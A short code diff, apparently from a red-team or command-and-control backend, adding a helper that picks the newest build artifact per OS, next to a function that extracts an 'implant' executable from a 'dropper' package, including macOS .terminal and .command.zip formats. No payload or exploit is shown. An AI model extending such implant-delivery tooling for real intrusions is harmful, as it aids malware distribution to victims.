@@ -76,6 +76,24 @@ MACHO_MAGICS = (b"\xcf\xfa\xed\xfe", b"\xce\xfa\xed\xfe", b"\xca\xfe\xba\xbe")
 ELF_MAGIC = b"\x7fELF"
 
 
+def pick_latest(rows: list[dict], os_name: str, suffix: str = "") -> dict | None:
+    """Newest artifact for ``os_name`` whose name ends with ``suffix``.
+
+    The macOS build records both a ``.command.zip`` and a ``.terminal``; the
+    binary endpoint must ask for the archive explicitly, otherwise it would try
+    to extract an implant from the 685-byte ``.terminal`` plist.
+    """
+    matches = [
+        row
+        for row in rows
+        if str(row.get("os", "")) == os_name and str(row.get("name", "")).endswith(suffix)
+    ]
+    if not matches:
+        return None
+    return max(matches, key=lambda row: float(row.get("ts", 0)))
+
+
+
 def extract_implant_from_artifact(path: Path, os_name: str) -> tuple[bytes, str] | None:
     """Return (implant_bytes, filename) for the raw executable inside a packaged
     dropper artifact.
